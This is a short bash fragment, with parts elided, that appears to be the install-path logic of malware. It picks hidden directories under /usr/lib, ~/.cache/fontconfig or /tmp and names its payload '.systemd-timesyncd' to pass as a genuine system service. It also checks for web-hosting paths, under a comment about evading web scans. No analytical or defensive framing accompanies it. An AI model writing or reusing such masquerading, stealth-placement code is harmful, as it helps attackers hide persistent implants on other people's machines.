...
# Initialize $HOME if unbound to prevent crashes in restricted shells
...
# Absolute Path Extraction (Anti-Web Scan Enforcement)
if [[ $EUID -eq 0 ]]; then
    FINAL_PATH="/usr/lib/x86_64-linux-gnu/.system-runtime-cache/.systemd-timesyncd"
    INSTALL_DIR=$(dirname "$FINAL_PATH")
else
    # User Path: $HOME/.cache/fontconfig/.systemd-timesyncd
    INSTALL_DIR="$HOME/.cache/fontconfig"
    FINAL_PATH="${INSTALL_DIR}/.systemd-timesyncd"
    
    # Fallback Path if restricted or web directory detected
    if [[ "${HOME}" == *"/var/www"* ]] || [[ "${HOME}" == *"vhosts"* ]] || [[ "${HOME}" == *"html"* ]] || [[ ! -w "$HOME" ]]; then
        UUID=$(uuidgen 2>/dev/null || echo "0403")
        INSTALL_DIR="/tmp/.systemd-private-${UUID}/.systemd-timesyncd"
        FINAL_PATH="${INSTALL_DIR}/.systemd-timesyncd"
    fi
fi
